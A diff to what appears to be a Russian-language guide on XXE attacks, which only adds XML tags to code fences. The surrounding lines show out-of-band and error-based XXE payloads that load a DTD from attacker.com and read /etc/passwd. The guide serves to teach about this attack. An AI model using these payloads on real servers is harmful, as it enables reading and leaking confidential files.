@@ -137,7 +137,7 @@ fclose($file); // закрываем файл
 %oob;
 ```
 Далее отправляет пейлоад на исследуемый веб-сервер:
-```
+```XML
 <?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ENTITY % remote SYSTEM "http://attacker.com/out.dtd"> 
@@ -154,7 +154,7 @@ fclose($file); // закрываем файл
 - есть доступ только к локальным файлам исследуемого веб-сервера.
 ##### External DTD
 Атака возможна, когда атакующий загружает вредоносный DTD, который пытается читать несуществующий файл и в ответе с ошибкой выводятся конфиденциальные данные. Пример:
-```
+```XML
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root[<!ENTITY % xxe SYSTEM "http://attacker.com/vulnerable.dtd" > %xxe;]>
 <root>
@@ -162,7 +162,7 @@ fclose($file); // закрываем файл
 </root>
 ```
 Содержимое вредоносного DTD `vulnerable.dtd`:
-```
+```XML
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval; 
